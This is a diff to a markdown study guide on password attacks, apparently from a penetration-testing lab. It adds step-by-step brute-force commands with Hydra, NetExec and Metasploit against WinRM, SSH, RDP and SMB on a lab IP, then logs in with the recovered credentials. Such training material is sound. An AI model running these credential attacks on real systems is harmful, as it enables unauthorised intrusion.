@@ -15,6 +15,7 @@ This document outlines common techniques used in **password attacks**. It is int
     - [Cracking Protected Archives](#cracking-protected-archives)
   - [Remote Password Attacks](#remote-password-attacks)
     - [Network Services](#network-services)
+    - [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
 
 ---
 
@@ -538,7 +539,7 @@ ls -la
 
 ### Network Services
 
-Apart from web applications, we will come across many different services, including:
+In addition to web applications, penetration testers frequently encounter a wide range of network services, including:
 
 - `FTP`
 - `SSH`
@@ -552,15 +553,20 @@ Apart from web applications, we will come across many different services, includ
 - `SMTP`
 - `LDAP`
 
-Many of these services may be misconfigured or configured with default settings.
+Many of these services are often misconfigured, exposed unnecessarily, or deployed with weak or default credentials.
 
 **WinRM**
 
-**Windows Remote Management (WinRM)** is the Microsoft implementation of the **Web Services Management Protocol (WS-Management)**. WinRM is an XML based network protocol using **Simple Object Access Protocol (SOAP)** for remote management of Windows systems. 
+**Windows Remote Management (WinRM)** is Microsoft’s implementation of the **Web Services Management Protocol (WS-Management)**. It is an XML-based protocol that uses **SOAP** to enable remote management of Windows systems.
 
-In newer versions of Windows (10/11), WinRM is not enabled by default, and must be manually activated and configured. By default, WinRM uses ports `5985` (HTTP) and `5986` (HTTPS). 
+On modern Windows versions (10/11), WinRM is disabled by default and must be explicitly enabled. When active, it typically listens on:
 
-`NetExec` is a handy tool that can be used for password attacks against WinRM, as well as other protocols, such as SMB, LDAP and MSSQL. 
+- `5985` – HTTP
+- `5986` – HTTPS
+
+`NetExec` is a versatile post-exploitation and credential-testing framework that supports multiple protocols, including WinRM, SMB, LDAP, and MSSQL.
+
+Install NetExec:
 
 Install `NetExec`:
 
@@ -568,7 +574,7 @@ Install `NetExec`:
 sudo apt install netexec -y
 ```
 
-The following example is a username and password attack against a WinRM endpoint:
+Perform a username/password attack against WinRM:
 
 ```bash
 netexec winrm 10.129.202.136 -u user-wordlist -p password-wordlist
@@ -582,7 +588,7 @@ john:november
 
 ![Filtered output](./.images/netexec-brute-force.PNG)
 
-Once valid credentials have been obtained, we can authenticae to the WinRM service with a tool called `Evil-WinRM`.
+Once valid credentials are obtained, `Evil-WinRM` can be used to establish an interactive PowerShell session.
 
 Install `Evil-WinRM`:
 
@@ -596,9 +602,113 @@ Authenticate:
 evil-winrm -i 10.129.202.136 -u john -p november
 ```
 
-The login is successful, and a terminal session is initialized.
+Successful login initializes a remote shell:
 
 ![Filtered output](./.images/evil-winrm.PNG)
 
 **SSH**
 
+**Secure Shell (SSH)** provides encrypted remote access to Linux and Unix systems and listens on port `22` by default.
+
+Tools such as `Hydra` can be used to brute-force SSH credentials:
+
+```bash
+hydra -L user-wordlist -P password-wordlist ssh://10.129.202.136
+```
+
+Recovered credentials:
+
+```
+dennis:rockstar
+```
+
+![Filtered output](./.images/hydra-ssh.PNG)
+
+Authenticate using the OpenSSH client:
+
+```bash
+ssh dennis@10.129.202.136
+```
+
+![Filtered output](./.images/ssh-authenticate.PNG)
+
+**RDP**
+
+**Remote Desktop Protocol (RDP)** enables remote graphical access to Windows systems and typically runs on port `3389`.
+
+Brute-force RDP credentials with Hydra:
+
+```bash
+hydra -L user-wordlist -P password-wordlist rdp://10.129.202.136
+```
+
+Recovered credentials:
+
+```
+chris:789456123
+```
+
+![Filtered output](./.images/hydra-rdp.PNG)
+
+Authenticate using `XFreeRDP`:
+
+```bash
+xfreerdp /v:10.129.202.136 /u:chris /p:789456123
+```
+
+![Filtered output](./.images/rdp-authenticate.PNG)
+
+**SMB**
+
+**Server Message Block (SMB)** is widely used in Windows environments for file sharing and printer services.
+
+Attempt brute-force authentication with Hydra:
+
+```bash
+hydra -L user-wordlist -P password-wordlist smb://10.129.202.136
+```
+
+Older versions of Hydra may fail against SMBv3 targets:
+
+```
+[ERROR] invalid reply from target smb://10.129.202.136:445/
+```
+
+![Filtered output](./.images/hydra-smb-error.PNG)
+
+In this case, either update Hydra or use Metasploit’s SMB login module:
+
+```bash
+search auxiliary/scanner/smb/smb_login
+use 0
+set RHOSTS 10.129.202.136
+set USER_FILE user-wordlist
+set PASS_FILE password-wordlist
+run
+```
+
+Recovered credentials:
+
+```
+cassie:12345678910
+```
+
+After obtaining credentials, `NetExec` can enumerate available shares and privileges:
+
+```bash
+netexec smb 10.129.202.136 -u cassie -p 12345678910 --shares
+```
+
+![Filtered output](./.images/netexec-smb.PNG)
+
+Connect to a specific share using `smbclient`:
+
+```bash
+smbclient -U cassie \\\\10.129.202.136\\CASSIE
+```
+
+![Filtered output](./.images/smbclient.PNG)
+
+---
+
+### Spraying, Stuffing, and Defaults
